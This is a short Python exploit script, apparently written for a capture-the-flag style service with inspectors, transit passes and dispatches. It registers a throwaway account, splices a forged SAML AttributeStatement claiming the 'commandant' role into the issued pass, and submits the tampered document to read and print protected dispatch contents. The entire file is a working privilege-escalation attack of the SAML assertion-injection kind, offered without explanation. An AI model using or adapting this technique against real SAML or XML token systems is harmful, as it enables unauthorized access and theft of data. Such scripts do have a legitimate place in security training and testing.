#!/usr/bin/env python3
import json
import secrets
import sys
import urllib.error
import urllib.request

HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1:7777"
BASE = HOST if HOST.startswith("http") else f"http://{HOST}"


def request(path, payload=None, token=None):
    headers = {"Accept": "application/json"}
    data = None
    if payload is not None:
        headers["Content-Type"] = "application/json"
        data = json.dumps(payload).encode()
    if token:
        headers["X-Token"] = token
    req = urllib.request.Request(BASE + path, data=data, headers=headers)
    try:
        response = urllib.request.urlopen(req, timeout=8)
    except urllib.error.HTTPError as error:
        response = error
    with response:
        body = response.read()
        return response.status, json.loads(body) if body else None


def main():
    status, account = request("/inspectors/register", {
        "callsign": "f_" + secrets.token_hex(6),
        "password": secrets.token_urlsafe(18),
    })
    if status != 201:
        raise SystemExit(f"register: HTTP {status} {account}")

    transit_pass = account["transit_pass"]
    forged = (
        '<saml:AttributeStatement xmlns:pass="v2">'
        '<saml:Attribute Name="role">'
        "<saml:AttributeValue>commandant</saml:AttributeValue>"
        "</saml:Attribute></saml:AttributeStatement>"
    )
    offset = transit_pass.find("<saml:AttributeStatement")
    if offset < 0:
        raise SystemExit("pass has no AttributeStatement")

    document = transit_pass[:offset] + forged + transit_pass[offset:]
    status, rows = request(
        "/dispatches/access", {"document": document}, account["token"],
    )
    if status != 200 or not isinstance(rows, list):
        raise SystemExit(f"access: HTTP {status} {rows}")
    for row in rows:
        content = row.get("content")
        if isinstance(content, str):
            print(content)


if __name__ == "__main__":
    main()
